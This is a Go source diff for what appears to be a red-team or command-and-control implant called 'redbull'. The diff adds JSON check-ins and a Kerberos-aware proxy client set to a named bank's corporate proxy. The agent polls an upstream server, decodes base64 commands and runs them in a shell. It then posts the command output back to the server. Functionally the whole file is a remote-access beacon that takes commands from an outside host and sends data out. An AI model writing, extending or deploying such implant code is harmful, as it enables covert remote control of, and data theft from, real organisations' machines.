@@ -4,9 +4,8 @@ import (
 	"bytes"
 	"context"
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
-	"io"
-	"net/http"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -14,20 +13,24 @@ import (
 	"strings"
 	"syscall"
 	"time"
+
+	"redbull/internal/rbhttp"
+	"redbull/internal/rbkrb"
 )
 
-var USERNAME = "foobar"
+var USERNAME = "zkokkdc"
 var PASSWORD = "foobar"
 var UPSTREAM = "http://localhost:8000"
-var PAC_URL = ""
+var PROXY_URL = "http://abproxy.bankofamerica.com:8080"
+var USE_KRB = false
 var SLEEP_TIME = 1 * time.Second
 var CWD = ""
 
-var COMMAND_MAP = map[string]func(cmd string) (string, string, error) {
+var COMMAND_MAP = map[string]func(cmd string) (string, string, error){
 	"shell": runBashWithTimeout,
-	"pwd": getCwd,
-	"cd": changeDirectory,
-	"ls": listDirectory,
+	"pwd":   getCwd,
+	"cd":    changeDirectory,
+	"ls":    listDirectory,
 }
 
 func init() {
@@ -62,7 +65,7 @@ func changeDirectory(command string) (string, string, error) {
 func listDirectory(_ string) (string, string, error) {
 	files, err := os.ReadDir(CWD)
 	if err != nil {
-		return "", "", fmt.Errorf("failed to read directory %s", CWD, err)
+		return "", "", fmt.Errorf("failed to read directory %s: %w", CWD, err)
 	}
 
 	fileNames := make([]string, 0)
@@ -112,6 +115,17 @@ func main() {
 	termSig := make(chan os.Signal, 1)
 	signal.Notify(termSig, syscall.SIGINT, syscall.SIGTERM)
 
+	var httpClient rbhttp.HttpClient
+	if USE_KRB {
+		var err error
+		httpClient, err = rbkrb.NewProxyAwareHttpClient(PROXY_URL, PASSWORD)
+		if err != nil {
+			panic(err)
+		}
+	} else {
+		httpClient = rbhttp.NewSimpleHttpClient()
+	}
+
 	for {
 		select {
 		case <-termSig:
@@ -119,7 +133,7 @@ func main() {
 		default:
 			time.Sleep(SLEEP_TIME)
 
-			resp, err := http.Get(UPSTREAM)
+			resp, err := httpClient.Get(UPSTREAM)
 			if err != nil {
 				continue
 			}
@@ -129,16 +143,17 @@ func main() {
 				continue
 			}
 
-			bodyBytes, err := io.ReadAll(resp.Body)
-			resp.Body.Close()
-			if err != nil {
-				sendResult("", "", err.Error())
+			var checkIn rbhttp.CheckInResponse
+			if err := json.NewDecoder(resp.Body).Decode(&checkIn); err != nil {
+				resp.Body.Close()
+				sendResult(httpClient, "", "", err.Error())
 				continue
 			}
+			resp.Body.Close()
 
-			decoded, err := base64.StdEncoding.DecodeString(string(bodyBytes))
+			decoded, err := base64.StdEncoding.DecodeString(checkIn.Command)
 			if err != nil {
-				sendResult("", "", err.Error())
+				sendResult(httpClient, "", "", err.Error())
 				continue
 			}
 
@@ -149,13 +164,28 @@ func main() {
 				stderr = fmt.Sprintf("%s\nerror: %s", stderr, err.Error())
 			}
 
-			sendResult(command, stdout, stderr)
+			sendResult(httpClient, command, stdout, stderr)
 		}
 	}
 }
 
-func sendResult(command, stdout, stderr string) {
-	result := fmt.Sprintf("%s\n\n%s\n\n%s", command, stdout, stderr)
-	encoded := base64.StdEncoding.EncodeToString([]byte(result))
-	http.Post(UPSTREAM, "text/plain", strings.NewReader(encoded))
+func sendResult(httpClient rbhttp.HttpClient, command, stdout, stderr string) {
+	result := rbhttp.HttpBody{
+		Command: command,
+		Stdout:  stdout,
+		Stderr:  stderr,
+	}
+	jsonBytes, err := json.Marshal(result)
+	if err != nil {
+		result = rbhttp.HttpBody{
+			Command: command,
+			Stdout:  "error: failed to marshal response",
+			Stderr:  fmt.Sprintf("error: %s", err.Error()),
+		}
+		jsonBytes, err = json.Marshal(result)
+		if err != nil {
+			panic(err)
+		}
+	}
+	httpClient.Post(UPSTREAM, "application/json", bytes.NewReader(jsonBytes))
 }
